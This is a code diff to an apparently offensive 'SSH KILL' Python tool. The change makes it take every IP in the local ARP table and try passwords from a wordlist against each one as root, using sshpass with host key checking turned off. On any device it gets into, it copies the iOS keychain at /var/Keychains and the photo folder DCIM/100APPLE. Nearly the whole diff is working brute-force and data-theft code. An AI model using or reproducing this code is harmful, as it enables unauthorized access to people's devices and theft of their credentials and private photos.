@@ -1,8 +1,10 @@
+import os
 import subprocess
 import time
 import optparse
 import time as mm
 import sys as n
+import re
 W = '\033[0m'  # white (normal)
 R = '\033[31m'  # red
 G = '\033[32m'  # green
@@ -29,6 +31,11 @@ def slow1(M):  ## By Twitter : @Matrix0700
     for c in M + '\n':
         n.stdout.write(c)
         n.stdout.flush()
+try:
+    os.system("apt install sshpass")
+    os.system("clear")
+except:
+    pass
 parser = optparse.OptionParser()
 parser.add_option("-p", "--path",dest="path", help="were you want save ")
 parser.add_option("-t", "--target",dest="target", help="target ip")
@@ -54,8 +61,8 @@ twitter =W+'Twitter :'
 Code = G+'𝚇 𝙲 𝙾 𝙳 𝙴'
 user = G+'@𝚇 𝙲 𝙾 𝙳 𝙴 𝙾 𝙽 𝙴 𝟷'
 logo=W+'''
-█▀ █▀ █░█   █▄▀ █ █░░ █░░   █░█ ▄█
-▄█ ▄█ █▀█   █░█ █ █▄▄ █▄▄   ▀▄▀ ░█
+█▀ █▀ █░█   █▄▀ █ █░░ █░░   █░█ ▀█
+▄█ ▄█ █▀█   █░█ █ █▄▄ █▄▄   ▀▄▀ █▄
 '''
 slow(C+f'''
 {logo}                            
@@ -69,13 +76,23 @@ point = W+'.'*6
 slow2(R+'Attack now\n'+W+'.'*65)
 parser = optparse.OptionParser()
 parser.add_option("-p", "--path",dest="path", help="path you save file in ")
-parser.add_option("-t", "--target",dest="target", help="put target ip")
 (options, arguments) = parser.parse_args()
 def getpassword(Password):
-        str(subprocess.run(
-        ["sshpass", "-p", Password,"sftp" ,"-r" ,f"root@{options.target}:/var/mobile/Media/DCIM/100APPLE/ %s" %options.path]))
-        str(subprocess.run(["sshpass", "-p", Password, "sftp", "-r",
-                            f"root@{options.target}:/var/Keychains %s" % options.path]))
+        check_ip = str(subprocess.run(['arp', '-a'], stdout=subprocess.PIPE))
+        All_ip = re.findall(re.compile('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'), check_ip)
+        for f in All_ip:
+            try:
+                ssh_run = str(subprocess.run(
+                    ["sshpass", "-p", Password, "ssh", "-o StrictHostKeyChecking=no", f"root@{f}"]))
+                os.system("clear")
+                commnad = ssh_run + "\n" + str(subprocess.run(["sshpass", "-p", Password, "sftp", "-r",
+                                                               f"root@{f}:/var/Keychains %s" % options.path])) + str(
+                    subprocess.run(
+                        ["sshpass", "-p", Password, "sftp", "-r",
+                         f"root@{f}:/var/mobile/Media/DCIM/100APPLE/ %s" % options.path]))
+                os.system("clear")
+            except:
+                print("hi")
 file = open("password.txt","r")
 lines = file.readlines()
 # print(type(lines))
